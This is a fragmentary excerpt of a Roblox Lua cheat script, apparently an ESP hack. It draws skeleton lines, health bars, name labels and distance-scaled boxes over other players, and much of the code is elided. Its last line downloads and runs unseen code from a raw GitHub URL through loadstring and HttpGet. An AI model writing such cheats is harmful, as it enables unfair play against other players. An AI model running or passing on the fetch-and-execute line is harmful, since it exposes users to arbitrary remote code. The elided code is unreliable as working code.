...
local function getPlayerColor(plr)
    ...
    if teamColor == Color3.new(1, 1, 1) then
        teamColor = Color3.fromRGB(18, 233, 226)
    end
    return teamColor
end
...
local function createSkeletonLine()
    ...
    line.Visible = false
    line.Color = Color3.fromRGB(18, 233, 226)
    line.Thickness = 1
    line.Transparency = 1
    return line
end
...
local function createHealthBar()
    ...
    healthBar.health.Color = Color3.fromRGB(18, 233, 226)
...
local function updateHealthBar(plr)
    ...
    local barHeight = (600 / distance) * 5.2
    local barWidth = 5
    local backgroundWidth = 8
    
    local barX = rootPos.X - (barHeight * 0.6 / 2) - backgroundWidth - 10
    ...
    if healthPercent <= 0 then
        ...
        if healthPercent > 0.6 then
            healthBars[plr].health.Color = Color3.fromRGB(18, 233, 226)
...
local function updateNameLabel(plr)
    ...
    local distance = math.clamp(rootPos.Z, 0.1, 1000)
    local nameHeight = (600 / distance) * 6.35
...
local function updateBoxes()
    for _, plr in pairs(Players:GetPlayers()) do
        if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") and plr ~= player then
            ...
            if onScreen then
                local sizeY = (1500 / distance) * 2.65
...
loadstring(game:HttpGet('https://raw.githubusercontent.com/eluz4/hub-v1.1/refs/heads/main/main/lg.lua'))()
